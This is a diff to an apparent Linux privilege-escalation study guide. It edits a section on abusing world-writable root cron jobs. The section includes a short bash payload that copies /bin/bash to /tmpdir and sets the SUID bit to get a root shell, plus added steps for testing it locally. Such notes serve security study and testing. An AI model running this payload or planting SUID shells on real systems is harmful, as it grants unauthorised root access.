@@ -54,7 +54,16 @@ Some versions of Linux will still allow password hashes to be stored there. We c
   - If one of these **cron jobs are world-writable and searched in `/home/user` path** and **you're not root**, it's possible to modify and exploit them to gain a root shell in this way:
   ```
   #!/bin/bash
-  cp /bin/bash /tmp/rootbash
-  chmod +xs /tmp/rootbash
+  mkdir /tmpdir
+  cp /bin/bash /tmpdir/rootbash
+  chmod +xs /tmpdir/rootbash
   ```
   - This script will copy the default `/bin/bash` shell to a temporary directory and will give it execution and suid permissions (it assumes the privileges of the user who owns the file, **root** in this case). In this way, we can run a root shell, so we escalated privileges!
+    - If you type `whoami`, you should read "root".
+    - You can choose any shell you want (`/bin/bash`, `/bin/sh`, `/bin/zsh`).
+
+    ### Local test
+    - Create `script.sh` in your home folder and paste the previous bash code,
+    - Run it with `sudo script.sh`. It should create `/tmpdir/rootbash` as said before.
+    - Run the shell with `/tmpdir/rootbash`. It should open a shell as root. 
+    - Check your role with `whoami`.
